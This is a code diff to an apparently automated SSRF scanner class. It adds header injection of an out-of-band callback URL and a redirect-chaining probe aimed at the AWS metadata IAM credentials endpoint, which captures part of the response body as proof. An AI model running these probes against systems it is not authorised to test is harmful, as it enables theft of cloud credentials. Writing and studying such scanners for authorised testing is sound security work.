@@ -135,11 +135,55 @@ class SSRFHunter:
             console.print(f"[dim yellow][SSRF] Sending unique OAST probe via {param_name}...[/dim yellow]")
             await self._probe(target_url)
             
-            # v38.0: The background loop in NeuralOrchestrator will handle detection and logging.
-            # We no longer need to sleep or local-poll here.
+            # ELITE LOGIC: Advanced Header Injection for Blind SSRF
+            console.print(f"[dim yellow][SSRF] Injecting OAST into every header for {base_url}...[/dim yellow]")
+            headers = {
+                "X-Forwarded-For": oast_payload,
+                "User-Agent": f"Mozilla/5.0 ({oast_payload})",
+                "Referer": oast_payload,
+                "X-Real-IP": oast_payload,
+                "True-Client-IP": oast_payload,
+                "Origin": oast_payload,
+                "Host": urllib.parse.urlparse(oast_payload).netloc if oast_payload.startswith("http") else oast_payload
+            }
+            try:
+                if self.session:
+                    await self.session.get(base_url, headers=headers, timeout=state.NETWORK_TIMEOUT)
+            except Exception:
+                pass
         
         return findings
 
+    async def _test_redirect_chaining(self, base_url: str) -> list[dict]:
+        """ELITE LOGIC: Attempts to chain an Open Redirect into Cloud Metadata SSRF."""
+        findings = []
+        parsed = urllib.parse.urlparse(base_url)
+        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        
+        redirect_params = ["url", "redirect", "next", "return", "target", "dest"]
+        metadata_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        
+        for p in redirect_params:
+            if p in params:
+                qs = params.copy()
+                qs[p] = [metadata_url]
+                new_query = urllib.parse.urlencode(qs, doseq=True)
+                target_url = parsed._replace(query=new_query).geturl()
+                
+                status, body = await self._probe(target_url)
+                if status == 200 and ("ami-id" in body or "iam/security-credentials" in body):
+                    console.print(f"[bold red][CRITICAL CHAIN] Open Redirect to AWS Metadata SSRF on {base_url}![/bold red]")
+                    findings.append(self._make_finding(
+                        vuln_type="SSRF via Open Redirect Chain",
+                        severity="CRITICAL",
+                        cvss=10.0,
+                        url=base_url,
+                        param=p,
+                        payload=metadata_url,
+                        proof=f"Chained redirect to metadata endpoint successful. Body snippet: {body[:100]}",
+                        confirmed=True
+                    ))
+        return findings
 
     @staticmethod
     def _make_finding(vuln_type, severity, cvss, url, param, payload, proof, confirmed) -> dict:
@@ -176,7 +220,7 @@ class SSRFHunter:
         }
 
     async def scan_urls(self, discovered_urls: list[str]) -> list[dict]:
-        """Scans a list of URLs for SSRF-vulnerable parameters."""
+        """Scans a list of URLs for SSRF-vulnerable parameters and Chains."""
         ssrf_candidates = [u for u in discovered_urls if self._extract_url_params(u)]
         if not ssrf_candidates:
             console.print("[dim][SSRF] No URL-bearing parameters found.[/dim]")
@@ -190,6 +234,10 @@ class SSRFHunter:
             for param_name, val in params:
                 results = await self._test_ssrf_param(url, param_name, val)
                 all_findings.extend(results)
+            
+            # Elite Logic: Open Redirect Chaining
+            chain_results = await self._test_redirect_chaining(url)
+            all_findings.extend(chain_results)
 
         confirmed = [f for f in all_findings if f.get("confirmed")]
         if confirmed:
